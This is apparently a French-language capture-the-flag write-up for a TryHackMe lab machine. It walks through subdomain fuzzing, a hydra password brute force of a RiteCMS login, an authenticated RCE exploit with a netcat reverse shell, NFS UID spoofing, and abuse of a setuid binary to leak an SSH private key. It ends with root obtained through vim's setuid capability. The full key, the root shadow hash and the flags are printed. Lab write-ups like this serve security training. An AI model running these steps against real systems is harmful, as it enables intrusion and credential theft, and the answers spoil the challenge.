# Undiscovered # 

## Task 1 Capture The Flag ##

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.176.85 undiscovered.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A undiscovered.thm -p- 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-13 10:26 CEST
Nmap scan report for undiscovered.thm (10.10.176.85)
Host is up (0.058s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:76:81:49:50:bb:6f:4f:06:15:cc:08:88:01:b8:f0 (RSA)
|   256 2b:39:d9:d9:b9:72:27:a9:32:25:dd:de:e4:01:ed:8b (ECDSA)
|_  256 2a:38:ce:ea:61:82:eb:de:c4:e0:2b:55:7f:cc:13:bc (ED25519)
80/tcp    open  http     Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100021  1,3,4      37610/udp6  nlockmgr
|   100021  1,3,4      40391/tcp   nlockmgr
|   100021  1,3,4      45991/tcp6  nlockmgr
|   100021  1,3,4      55488/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs      2-4 (RPC #100003)
40391/tcp open  nlockmgr 1-4 (RPC #100021)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=9/13%OT=22%CT=1%CU=36676%PV=Y%DS=2%DC=T%G=Y%TM=613F0BA
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=2%ISR=109%TI=Z%CI=I%II=I%TS=8)SEQ
OS:(SP=103%GCD=1%ISR=108%TI=Z%II=I%TS=8)OPS(O1=M506ST11NW6%O2=M506ST11NW6%O
OS:3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11NW6%O6=M506ST11)WIN(W1=68DF%W2=
OS:68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSN
OS:W6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   33.12 ms 10.9.0.1
2   36.92 ms undiscovered.thm (10.10.176.85)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.48 seconds

```

D'après le scan nmap on vois plusieurs service qui sont : 
Le service SSH sur le port 22.   
Le service HTTP sur le port 80.   
Le service rpcbind sur le port 111.  
Le service de partage nfs sur le port 2049.   
Le servie nlockmgr sur le port 40391.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ showmount -e undiscovered.thm 
clnt_create: RPC: Program not registered
```

Il y a rien sur le partage NFS.   

![page1](./Task1-01.png) 

Sur la page principale il y a rien qui puisse nous aider.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://undiscovered.thm -w /usr/share/dirb/wordlists/common.txt -q
/.hta                 (Status: 403) [Size: 281]
/.htpasswd            (Status: 403) [Size: 281]
/.htaccess            (Status: 403) [Size: 281]
/images               (Status: 301) [Size: 321] [--> http://undiscovered.thm/images/]
/index.php            (Status: 200) [Size: 355]                                      
/server-status        (Status: 403) [Size: 281]                                      
```

On tente de trouver des répertoires cachés il y a pas grand chose.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt  -u http://undiscovered.thm/ -H 'HOST: FUZZ.undiscovered.thm' --sc 200
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://undiscovered.thm/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                      
=====================================================================

000000491:   200        68 L     341 W      4584 Ch     "manager - manager"                                                                                                                                                          
000000516:   200        68 L     341 W      4626 Ch     "dashboard - dashboard"                                                                                                                                                      
000000522:   200        82 L     341 W      4650 Ch     "deliver - deliver"                                                                                                                                                          
000000566:   200        68 L     341 W      4584 Ch     "newsite - newsite"                                                                                                                                                          
000000612:   200        68 L     341 W      4584 Ch     "develop - develop"                                                                                                                                                          
000000633:   200        68 L     341 W      4668 Ch     "maintenance - maintenance"                                                                                                                                                  
000000630:   200        68 L     341 W      4542 Ch     "forms - forms"                                                                                                                                                              
000000628:   200        68 L     341 W      4584 Ch     "network - network"                                                                                                                                                          
000000685:   200        83 L     341 W      4599 Ch     "booking - booking"                                                                                                                                                          
000000680:   200        68 L     341 W      4542 Ch     "start - start"                                                                                                                                                              
000000678:   200        68 L     341 W      4521 Ch     "play - play"                                                                                                                                                                
000000674:   200        68 L     341 W      4605 Ch     "mailgate - mailgate"                                                                                                                                                        
000000665:   200        68 L     341 W      4521 Ch     "view - view"                                                                                                                                                                
000000702:   200        68 L     341 W      4626 Ch     "resources - resources"                                                                                                                                                      
000000696:   200        68 L     341 W      4605 Ch     "internet - internet"                                                                                                                                                        
000000694:   200        68 L     341 W      4521 Ch     "gold - gold"                                                                                                                                                                
000000691:   200        68 L     341 W      4605 Ch     "terminal - terminal"                                                                                                                                                        

Total time: 70.93616
Processed Requests: 19966
Filtered Requests: 19949
Requests/sec.: 281.4643
```

On bruteforce des sous domaines et plusieurs sous domaines apparaissent.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.176.85 dashboard.undiscovered.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 
```

On choisit dashboard comme sous domaine en modifiant le fichier hosts.  

![page2](./Task1-02.png) 

Sur la page principale on voit que le site fait avec le cms RiteCMS version 2.2.1.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ searchsploit ritecms
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
RiteCMS 1.0.0 - Multiple Vulnerabilities                                                                                                                                                                    | php/webapps/27315.txt
RiteCMS 2.2.1 - Authenticated Remote Code Execution                                                                                                                                                         | php/webapps/48636.txt
RiteCMS 2.2.1 - Remote Code Execution (Authenticated)                                                                                                                                                       | php/webapps/48915.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

```

On trouve un exploit pour riteCMS 2.2.1 mais il faut pouvoir s'identifier.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://dashboard.undiscovered.thm -w /usr/share/dirb/wordlists/common.txt -q
/.hta                 (Status: 403) [Size: 291]
/.htaccess            (Status: 403) [Size: 291]
/.htpasswd            (Status: 403) [Size: 291]
/index.php            (Status: 200) [Size: 4626]
/server-status        (Status: 403) [Size: 291] 
```

Je trouve rien je me suis trompé de sous domaine.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -c -u http://undiscovered.thm/cms/ -H 'HOST: FUZZ.undiscovered.thm' --sc 200
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://undiscovered.thm/cms/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                      
=====================================================================

000000522:   200        36 L     80 W       1121 Ch     "deliver - deliver"                                                                                                                                                          

Total time: 75.47257
Processed Requests: 19966
Filtered Requests: 19965
Requests/sec.: 264.5464
```

On trouve que le sous domaine deliver contient le repertoire cms.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.176.85 deliver.undiscovered.thm' >> /etc/hosts"
```

On configure le sous domaine.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl http:// deliver.undiscovered.thm/cms/ -s | grep name
<p><label for="login">Name:</label><br /><input id="login" type="text" name="username" /></p>
<p><label for="pw">Password:</label><br /><input id="pw" type="password" name="userpw" /></p>
```

Les noms des champs sont : username et userpw.   

![page3](./Task1-03.png)    

Le message d'erreur quand on met un mauvais mode de passe est : User unknown or password wrong.  

On a tout ce qu'il faut pour configurer hydra pour brute forcer le mot de passe.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ hydra -l admin -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/index.php:username=admin&userpw=^PASS^:wrong"
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-13 11:24:55
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://deliver.undiscovered.thm:80/cms/index.php:username=admin&userpw=^PASS^:wrong
[80][http-post-form] host: deliver.undiscovered.thm   login: admin   password: liverpool
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-13 11:24:59
```

On brute force le mot de passe et on trouve liverpool comme mot de passe.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lnvp 1234
listening on [any] 1234 ...
```

On écoute le port 1234 pour se connecter au reverse shell.

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cp /usr/share/exploitdb/exploits/php/webapps/48915.py ./
tim@kali:~/Bureau/tryhackme/write-up$ python2 48915.py http://deliver.undiscovered.thm  admin:liverpool

 	 _____  _ _        _____ __  __  _____
 	|  __ \(_) |      / ____|  \/  |/ ____|
 	| |__) |_| |_ ___| |    | \  / | (___              ___    ___   ___
 	|  _  /| | __/ _ \ |    | |\/| |\___ \     _  __  |_  |  |_  | <  /
 	| | \ \| | ||  __/ |____| |  | |____) |   | |/ / / __/_ / __/_ / /
 	|_|  \_\_|\__\___|\_____|_|  |_|_____/    |___/ /____(_)____(_)_/

	--------------------------------------------------------------
	|  RiteCMS v2.2.1 - Authenticated Remote Code Execution      |
	--------------------------------------------------------------
	| Reference : https://www.exploit-db.com/exploits/48636      |
	| By        : H0j3n                                          |
	--------------------------------------------------------------

[+] IP : http://deliver.undiscovered.thm
[+] USERNAME : admin
[+] PASSWORD : liverpool

[+] Credentials Working!
Enter LHOST : 10.9.228.66
Enter LPORT : 1234
Enter FileName (include.php) : 

[+] File uploaded and can be found!
Exploit Now (y/n)?y

W0rk1ng!!! Enjoy :)
```

On injecte l'exploit et l'exécute.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.9.228.66] from (UNKNOWN) [10.10.176.85] 53644
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/home/william	*(rw,root_squash)
```

On voit que le répertoire /home/william est partagé en nfs.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ mkdir /tmp/files
tim@kali:~/Bureau/tryhackme/write-up$ sudo mount -t nfs deliver.undiscovered.thm:/home/william /tmp/files
```

On monte le partage dans /tmp/files.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cd /tmp/files/
bash: cd: /tmp/files/: Permission non accordée

tim@kali:~/Bureau/tryhackme/write-up$ ls  -al /tmp/ | grep files
drwxr-x---  4 william william    4096  9 sept.  2020 files
```

J'ai pas la permission car je ne suis pas william.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo adduser william
Ajout de l'utilisateur « william » ...
Ajout du nouveau groupe « william » (1001) ...
Ajout du nouvel utilisateur « william » (1001) avec le groupe « william » ...
Création du répertoire personnel « /home/william »...
Copie des fichiers depuis « /etc/skel »...
Nouveau mot de passe : 
Retapez le nouveau mot de passe : 
passwd: password updated successfully
Changing the user information for william
Enter the new value, or press ENTER for the default
	Full Name []: 
	Room Number []: 
	Work Phone []: 
	Home Phone []: 
	Other []: 
Cette information est-elle correcte ? [O/n]O
```

On crée un utilisateur william.  

```bash
www-data@undiscovered:/var/www/deliver.undiscovered.thm/media$ cat /etc/passwd | grep william
<www/deliver.undiscovered.thm/media$ cat /etc/passwd | grep william          
william:x:3003:3003::/home/william:/bin/bash
```

On récupère le numéro id et group de william. 

```bash
tim@kali:~/Bureau/tryhackme/write-up$ id william 
uid=1001(william) gid=1001(william) groupes=1001(william)
tim@kali:~/Bureau/tryhackme/write-up$ sudo sed -i 's/1001/3003/g' /etc/passwd

tim@kali:~/Bureau/tryhackme/write-up$ su william
Mot de passe : 
┌──(william㉿kali)-[/home/tim/Bureau/tryhackme/write-up]
└─$ cd /tmp/files/

┌──(william㉿kali)-[/tmp/files]
└─$ cat user.txt
THM{8d7b7299cccd1796a61915901d0e091c}
```

On change uid, gid et le groupe de william par la valeure 3003.  
On se connecte sur le compte william.  
On va dans le partage de william on lit le fichier user.txt

La réponse est : THM{8d7b7299cccd1796a61915901d0e091c}  

**Whats the root user's password hash?**

```bash
└─$ ls -al
total 44
drwxr-x---  4 william william    4096  9 sept.  2020 .
drwxrwxrwt 21 root    root       4096 13 sept. 11:45 ..
-rwxr-xr-x  1 root    root        128  4 sept.  2020 admin.sh
-rw-------  1 root    root          0  9 sept.  2020 .bash_history
-rw-r--r--  1 william william    3771  4 sept.  2020 .bashrc
drwx------  2 william william    4096  4 sept.  2020 .cache
drwxrwxr-x  2 william william    4096  4 sept.  2020 .nano
-rw-r--r--  1 william william      43  4 sept.  2020 .profile
-rwsrwsr-x  1 nobody  4294967294 8776  4 sept.  2020 script
-rw-r-----  1 root    william      38  9 sept.  2020 user.txt
┌──(william㉿kali)-[/tmp/files]
└─$ cp script /tmp/
```

On voit que script est setuid.
On le copie dans tmp pour analyse.  

```cpp
undefined8 main(undefined8 param_1,long param_2)

{
  long in_FS_OFFSET;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (*(long *)(param_2 + 8) == 0) {
    system("./admin.sh");
  }
  else {
    setreuid(0x3ea,0x3ea);
    local_78 = 0x7461632f6e69622f;
    local_70 = 0x6c2f656d6f682f20;
    local_68 = 0x2f6472616e6f65;
    strcat((char *)&local_78,*(char **)(param_2 + 8));
    system((char *)&local_78);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

On décompile fichier avec ghidra. 
Si on met aucun paramètre le fichier exécute le fichier admin.sh.
Sinon il se met les droits de l'utilsateur qui a le id 1002. 

```python
>>> bytearray.fromhex("7461632f6e69622f").decode()
'tac/nib/'
>>> bytearray.fromhex("6c2f656d6f682f20").decode()
'l/emoh/ '
>>> bytearray.fromhex("2f6472616e6f65").decode()
'/dranoe'
```

On décode la chaîne comme l'architecture est en little endian on inverse la chaîne. 
/bin/cat /home/leonard/.  

Le programme ajoute l'argument à la fin de la chaîne.

```bash
┌──(william㉿kali)-[/tmp]
└─$ chmod 777 files/
```

On changes les droits pour que avec mon shell avec les droits www-data je puisse exécuter script.  

```bash
www-data@undiscovered:/home/william$ ./script /.ssh/id_rsa
./script /.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAwErxDUHfYLbJ6rU+r4oXKdIYzPacNjjZlKwQqK1I4JE93rJQ
HEhQlurt1Zd22HX2zBDqkKfvxSxLthhhArNLkm0k+VRdcdnXwCiQqUmAmzpse9df
YU/UhUfTu399lM05s2jYD50A1IUelC1QhBOwnwhYQRvQpVmSxkXBOVwFLaC1AiMn
SqoMTrpQPxXlv15Tl86oSu0qWtDqqxkTlQs+xbqzySe3y8yEjW6BWtR1QTH5s+ih
hT70DzwhCSPXKJqtPbTNf/7opXtcMIu5o3JW8Zd/KGX/1Vyqt5ememrwvaOwaJrL
+ijSn8sXG8ej8q5FidU2qzS3mqasEIpWTZPJ0QIDAQABAoIBAHqBRADGLqFW0lyN
C1qaBxfFmbc6hVql7TgiRpqvivZGkbwGrbLW/0Cmes7QqA5PWOO5AzcVRlO/XJyt
+1/VChhHIH8XmFCoECODtGWlRiGenu5mz4UXbrVahTG2jzL1bAU4ji2kQJskE88i
72C1iphGoLMaHVq6Lh/S4L7COSpPVU5LnB7CJ56RmZMAKRORxuFw3W9B8SyV6UGg
Jb1l9ksAmGvdBJGzWgeFFj82iIKZkrx5Ml4ZDBaS39pQ1tWfx1wZYwWw4rXdq+xJ
xnBOG2SKDDQYn6K6egW2+aNWDRGPq9P17vt4rqBn1ffCLtrIN47q3fM72H0CRUJI
Ktn7E2ECgYEA3fiVs9JEivsHmFdn7sO4eBHe86M7XTKgSmdLNBAaap03SKCdYXWD
BUOyFFQnMhCe2BgmcQU0zXnpiMKZUxF+yuSnojIAODKop17oSCMFWGXHrVp+UObm
L99h5SIB2+a8SX/5VIV2uJ0GQvquLpplSLd70eVBsM06bm1GXlS+oh8CgYEA3cWc
TIJENYmyRqpz3N1dlu3tW6zAK7zFzhTzjHDnrrncIb/6atk0xkwMAE0vAWeZCKc2
ZlBjwSWjfY9Hv/FMdrR6m8kXHU0yvP+dJeaF8Fqg+IRx/F0DFN2AXdrKl+hWUtMJ
iTQx6sR7mspgGeHhYFpBkuSxkamACy9SzL6Sdg8CgYATprBKLTFYRIUVnZdb8gPg
zWQ5mZfl1leOfrqPr2VHTwfX7DBCso6Y5rdbSV/29LW7V9f/ZYCZOFPOgbvlOMVK
3RdiKp8OWp3Hw4U47bDJdKlK1ZodO3PhhRs7l9kmSLUepK/EJdSu32fwghTtl0mk
OGpD2NIJ/wFPSWlTbJk77QKBgEVQFNiowi7FeY2yioHWQgEBHfVQGcPRvTT6wV/8
jbzDZDS8LsUkW+U6MWoKtY1H1sGomU0DBRqB7AY7ON6ZyR80qzlzcSD8VsZRUcld
sjD78mGZ65JHc8YasJsk3br6p7g9MzbJtGw+uq8XX0/XlDwsGWCSz5jKFDXqtYM+
cMIrAoGARZ6px+cZbZR8EA21dhdn9jwds5YqWIyri29wQLWnKumLuoV7HfRYPxIa
bFHPJS+V3mwL8VT0yI+XWXyFHhkyhYifT7ZOMb36Zht8yLco9Af/xWnlZSKeJ5Rs
LsoGYJon+AJcw9rQaivUe+1DhaMytKnWEv/rkLWRIaiS+c9R538=
-----END RSA PRIVATE KEY-----
```

On récupère la clef privée de leonard.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat leonard.key
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAwErxDUHfYLbJ6rU+r4oXKdIYzPacNjjZlKwQqK1I4JE93rJQ
HEhQlurt1Zd22HX2zBDqkKfvxSxLthhhArNLkm0k+VRdcdnXwCiQqUmAmzpse9df
YU/UhUfTu399lM05s2jYD50A1IUelC1QhBOwnwhYQRvQpVmSxkXBOVwFLaC1AiMn
SqoMTrpQPxXlv15Tl86oSu0qWtDqqxkTlQs+xbqzySe3y8yEjW6BWtR1QTH5s+ih
hT70DzwhCSPXKJqtPbTNf/7opXtcMIu5o3JW8Zd/KGX/1Vyqt5ememrwvaOwaJrL
+ijSn8sXG8ej8q5FidU2qzS3mqasEIpWTZPJ0QIDAQABAoIBAHqBRADGLqFW0lyN
C1qaBxfFmbc6hVql7TgiRpqvivZGkbwGrbLW/0Cmes7QqA5PWOO5AzcVRlO/XJyt
+1/VChhHIH8XmFCoECODtGWlRiGenu5mz4UXbrVahTG2jzL1bAU4ji2kQJskE88i
72C1iphGoLMaHVq6Lh/S4L7COSpPVU5LnB7CJ56RmZMAKRORxuFw3W9B8SyV6UGg
Jb1l9ksAmGvdBJGzWgeFFj82iIKZkrx5Ml4ZDBaS39pQ1tWfx1wZYwWw4rXdq+xJ
xnBOG2SKDDQYn6K6egW2+aNWDRGPq9P17vt4rqBn1ffCLtrIN47q3fM72H0CRUJI
Ktn7E2ECgYEA3fiVs9JEivsHmFdn7sO4eBHe86M7XTKgSmdLNBAaap03SKCdYXWD
BUOyFFQnMhCe2BgmcQU0zXnpiMKZUxF+yuSnojIAODKop17oSCMFWGXHrVp+UObm
L99h5SIB2+a8SX/5VIV2uJ0GQvquLpplSLd70eVBsM06bm1GXlS+oh8CgYEA3cWc
TIJENYmyRqpz3N1dlu3tW6zAK7zFzhTzjHDnrrncIb/6atk0xkwMAE0vAWeZCKc2
ZlBjwSWjfY9Hv/FMdrR6m8kXHU0yvP+dJeaF8Fqg+IRx/F0DFN2AXdrKl+hWUtMJ
iTQx6sR7mspgGeHhYFpBkuSxkamACy9SzL6Sdg8CgYATprBKLTFYRIUVnZdb8gPg
zWQ5mZfl1leOfrqPr2VHTwfX7DBCso6Y5rdbSV/29LW7V9f/ZYCZOFPOgbvlOMVK
3RdiKp8OWp3Hw4U47bDJdKlK1ZodO3PhhRs7l9kmSLUepK/EJdSu32fwghTtl0mk
OGpD2NIJ/wFPSWlTbJk77QKBgEVQFNiowi7FeY2yioHWQgEBHfVQGcPRvTT6wV/8
jbzDZDS8LsUkW+U6MWoKtY1H1sGomU0DBRqB7AY7ON6ZyR80qzlzcSD8VsZRUcld
sjD78mGZ65JHc8YasJsk3br6p7g9MzbJtGw+uq8XX0/XlDwsGWCSz5jKFDXqtYM+
cMIrAoGARZ6px+cZbZR8EA21dhdn9jwds5YqWIyri29wQLWnKumLuoV7HfRYPxIa
bFHPJS+V3mwL8VT0yI+XWXyFHhkyhYifT7ZOMb36Zht8yLco9Af/xWnlZSKeJ5Rs
LsoGYJon+AJcw9rQaivUe+1DhaMytKnWEv/rkLWRIaiS+c9R538=
-----END RSA PRIVATE KEY-----

tim@kali:~/Bureau/tryhackme/write-up$ chmod 700 leonard.key 
tim@kali:~/Bureau/tryhackme/write-up$ ssh -i leonard.key leonard@undiscovered.thm
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


0 packages can be updated.
0 updates are security updates.


Last login: Fri Sep  4 22:57:43 2020 from 192.168.68.129
```

On enregistre la clef.
On met les bon droits. 
On se connecte et on obtient un shell avec les droits de leonard.   

```bash
leonard@undiscovered:~$ id
uid=1002(leonard) gid=1002(leonard) groups=1002(leonard),3004(developer)
leonard@undiscovered:~$ getcap -r / 2>/dev/null
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_setuid+ep

leonard@undiscovered:~$ /usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")

# id
uid=0(root) gid=1002(leonard) groups=1002(leonard),3004(developer)

# cat /etc/shadow | grep root
root:$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0:18508:0:99999:7:::
```

On voit que vim.basic a la capacité d'être setuid.   
On demande à vim de nous ouvrir un shell avec les droits root, procédures expliqués sur [gtfobins](https://gtfobins.github.io/gtfobins/vim/#capabilities)    
On a un shell root, on lit le hash root dans le fichier shadow.   

La réponse est : $6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0  

